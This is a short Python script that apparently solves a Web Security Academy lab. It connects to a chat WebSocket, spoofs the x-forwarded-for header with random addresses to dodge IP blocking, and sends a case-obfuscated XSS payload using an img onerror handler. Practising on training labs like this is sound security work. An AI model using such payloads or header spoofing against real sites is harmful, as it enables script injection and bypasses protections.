import random
import threading
import time
from typing import Callable

from websocket import WebSocket
from websocket import WebSocketApp

LAB_ID = "???"


def WS_chat(
        on_open: Callable[[WebSocket], None] = lambda ws: print("opened connection"),
        on_message: Callable[[WebSocket, str], None] = lambda ws, msg: print(msg),
        on_error: Callable[[WebSocket, Exception], None] = lambda ws, ex: print(ex),
        on_close: Callable[[WebSocket, int, str], None] = lambda ws, code, msg: print(f"closed with msg: {msg}"),
) -> WebSocketApp:
    method, path = 'GET', '/chat'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Sec-WebSocket-Version': '13',
        'Sec-WebSocket-Key': 'snTDbaFVqEi8e4k6IGqYNw==',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'websocket',
        'Sec-Fetch-Site': 'same-origin',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'x-forwarded-for': '1.1.1.' + str(random.randint(0, 999)),
    }
    ws = WebSocketApp(
        url=f"wss://{host}{path}",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        header=headers,
    )
    threading.Thread(target=lambda: ws.run_forever(reconnect=1)).start()
    time.sleep(0.5)
    return ws


ws = WS_chat()
ws.send("READY")
message = "<iMg sRc=1 oNerRor='alert`1`'>"
ws.send(f"""{{"message":"{message}"}}""")
